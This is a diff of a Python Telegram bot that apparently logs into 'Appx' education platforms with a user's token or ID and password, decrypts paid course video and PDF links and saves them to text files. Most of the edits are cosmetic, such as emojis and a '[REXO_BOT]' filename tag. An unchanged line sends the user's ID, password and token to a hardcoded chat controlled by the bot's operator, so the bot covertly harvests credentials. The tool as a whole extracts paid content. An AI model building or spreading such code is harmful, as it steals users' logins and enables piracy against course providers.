@@ -65,7 +65,7 @@ async def start(bot, m):
     input01: Message = await bot.listen(editable.chat.id)
     raw_text05 = input01.text
     await input01.delete(True)
-    await editable.edit("Send Authorization Token or **ID & Password** 🧲")
+    await editable.edit("Send **Token** or **ID & Password** 🧲")
     login_hdr = {
         'Client-Service': 'Appx',
         'Auth-Key': 'appxapi',
@@ -119,12 +119,12 @@ async def start(bot, m):
     cool = ""
     total_links = 0
     for data in topicid:
-        aa = f" `{data['id']}` » {data['course_name']} ❇️ ₹{data['price']}\n\n"
+        aa = f" `{data['id']}` » {data['course_name']} ✳️ ₹{data['price']}\n\n"
         if len(f'{cool}{aa}') > 4096:
             print(aa)
             cool = ""
         cool += aa
-    await editable.edit(f"Login successfull....⚙️")
+    await editable.edit(f"Login successfull....✅⚙️")
     await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}")
     await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
     input1 = await bot.listen(editable.chat.id)
@@ -171,7 +171,7 @@ async def start(bot, m):
                         pdf_link2_decrypted = decrypt(pdf_link2.split(":")[0])
                         video_link += f"\n({subject_title}) {video_title} PDF-2:{pdf_link2_decrypted}"
                         total_links += 1
-                    with open(f"{course_title}.txt", 'a') as f:
+                    with open(f"{course_title} [REXO_BOT].txt", 'a') as f:
                         f.write(f"({subject_title}) {video_title.replace('||', '').replace('#', '')}:{video_link}\n")
                         total_links += 1
                 else:
@@ -195,10 +195,11 @@ async def start(bot, m):
                         if pdf_lk2:
                             pdf_link2_decrypted = decrypt(pdf_lk2.split(":")[0])
                             video_link += f"\n({subject_title}) {video_title} PDF-2:{pdf_link_decrypted}"
+                            total_links += 1
                         else:
                             pdf_link2_decrypted = "None"
                         
-                        with open(f"{course_title}.txt", 'a') as f:
+                        with open(f"{course_title} [REXO_BOT].txt", 'a') as f:
                             f.write(f"({subject_title}) {video_title.replace('||', '').replace('#', '')}:{video_link}\n")
                             total_links += 1
  
